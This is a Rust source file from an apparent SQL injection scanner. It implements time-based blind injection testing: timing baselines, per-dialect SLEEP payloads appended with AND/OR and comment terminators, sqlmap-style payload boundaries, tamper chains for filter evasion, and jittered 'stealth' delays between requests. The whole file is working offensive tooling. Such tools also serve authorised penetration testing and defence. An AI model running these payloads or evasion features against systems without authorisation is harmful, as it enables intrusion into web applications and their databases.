//! Time-based blind SQL injection technique.

use std::time::{Duration, Instant};
use tokio::time::timeout;
use tracing::{debug, info, warn};

use crate::sqx::{
    detector::SqliDetector,
    evasion::tamper_chain::TamperChain,
    models::{SqliTestResult, SqliTechnique},
};

impl SqliDetector {
    /// Test for time-based blind SQL injection
    pub(crate) async fn test_time_based(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        tamper: Option<&TamperChain>,
    ) -> Option<SqliTestResult> {
        debug!("Testing time-based blind SQL injection on parameter: {}", param);

        // Statistical baseline: 3 samples → mean + 2σ threshold
        let (baseline_mean, baseline_stddev) = self.measure_baseline_timing(url, 3).await.ok()?;
        let sleep_secs = self.compute_adaptive_sleep(baseline_mean, baseline_stddev);
        self.set_adaptive_sleep(sleep_secs);
        let threshold = baseline_mean + baseline_stddev * 2;

        // 1. Built-in dialects path
        for dialect in crate::sqx::dbms::all_dialects() {
            let suffix = dialect.time_based_payload(sleep_secs);
            if suffix.is_empty() {
                continue;
            }

            let sleep_fn = dialect.sleep_function(sleep_secs);
            let candidates = [
                format!("{}{}", original_value, suffix),               // string ctx
                format!("{} AND {}-- ", original_value, sleep_fn),     // numeric ctx
                format!("{} OR {}-- ", original_value, sleep_fn),      // OR fallback
            ];

            for payload in &candidates {
                if let Some(res) = self.try_time_payload(url, param, original_value, payload, tamper, sleep_secs, threshold, Some(dialect.name()), None).await {
                    return Some(res);
                }
            }
        }

        // 2. Dynamic sqlmap payloads path (stype=5)
        let dynamic = crate::sqx::payload_fetcher::DynamicPayloads::load();
        let tests: Vec<_> = dynamic.tests.iter().filter(|t| t.stype == 5).collect();

        for test in tests {
            if test.level > 3 { continue; }

            for boundary in &dynamic.boundaries {
                if !test.clause.is_empty() && !boundary.clause.is_empty() {
                    if !test.clause.iter().any(|tc| boundary.clause.contains(tc)) {
                        continue;
                    }
                }

                let where_bit = if test.where_clause.is_empty() || boundary.where_clause.is_empty() {
                    1u8
                } else {
                    boundary.where_clause.iter()
                        .find(|bw| test.where_clause.contains(bw))
                        .copied()
                        .unwrap_or(1)
                };

                let payload = self.apply_sqlmap_boundary_time(
                    original_value, &test.request_payload, boundary, where_bit, sleep_secs
                );

                if let Some(res) = self.try_time_payload(
                    url, param, original_value, &payload, tamper, sleep_secs, threshold,
                    None, Some(&test.title)
                ).await {
                    return Some(res);
                }
            }
        }

        None
    }

    /// Apply sqlmap boundary for time-based tests respecting <where> semantics.
    fn apply_sqlmap_boundary_time(
        &self,
        original: &str,
        payload_template: &str,
        boundary: &crate::sqx::payload_fetcher::SqlmapBoundary,
        where_bit: u8,
        sleep_secs: u64,
    ) -> String {
        use crate::sqx::payload_fetcher::DynamicPayloads;
        let prefix = DynamicPayloads::resolve_placeholders(&boundary.prefix, 42, "sqx", original, "1=1", sleep_secs);
        let suffix = DynamicPayloads::resolve_placeholders(&boundary.suffix, 42, "sqx", original, "1=1", sleep_secs);
        let payload = DynamicPayloads::resolve_placeholders(payload_template, 42, "sqx", original, "1=1", sleep_secs);

        match where_bit {
            2 => format!("{}{}{}", prefix, payload, suffix),
            3 => format!("{}{}{}", prefix, payload, suffix),
            _ => format!("{}{}{}{}", original, prefix, payload, suffix),
        }
    }

    async fn try_time_payload(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        payload: &str,
        tamper: Option<&TamperChain>,
        sleep_secs: u64,
        threshold: Duration,
        dbms_hint: Option<&str>,
        payload_id: Option<&str>,
    ) -> Option<SqliTestResult> {
        let effective = tamper
            .map(|t| t.apply(payload))
            .unwrap_or_else(|| payload.to_string());
        let test_url = self.build_test_url(url, param, original_value, &effective);

        let start = Instant::now();
        match timeout(
            Duration::from_secs(10 + sleep_secs),
            self.send_request(&test_url),
        ).await {
            Ok(Ok(_)) => {
                let duration = start.elapsed();
                let detection_threshold = threshold + Duration::from_secs(sleep_secs / 2);
                if duration > detection_threshold {
                    info!(
                        "Time-based blind SQL injection found! Payload: {}",
                        payload_id.unwrap_or("built-in")
                    );
                    return Some(SqliTestResult {
                        parameter: param.to_string(),
                        technique: SqliTechnique::TimeBased,
                        confidence: 0.9,
                        payload: effective,
                        evidence: format!(
                            "Response time: {:?} (threshold: {:?})",
                            duration, detection_threshold
                        ),
                        dbms_hint: dbms_hint.map(|s| s.to_string()),
                        injection_context: None,
                        payload_id: payload_id.map(|s| s.to_string()),
                    });
                }
            }
            Ok(Err(e)) => {
                warn!("Request failed for time-based test: {}", e);
            }
            Err(_) => {
                info!("Time-based blind SQL injection found (timeout)!");
                return Some(SqliTestResult {
                    parameter: param.to_string(),
                    technique: SqliTechnique::TimeBased,
                    confidence: 0.85,
                    payload: effective,
                    evidence: "Request timed out (SLEEP)".to_string(),
                    dbms_hint: dbms_hint.map(|s| s.to_string()),
                    injection_context: None,
                    payload_id: payload_id.map(|s| s.to_string()),
                });
            }
        }
        tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
        None
    }
}
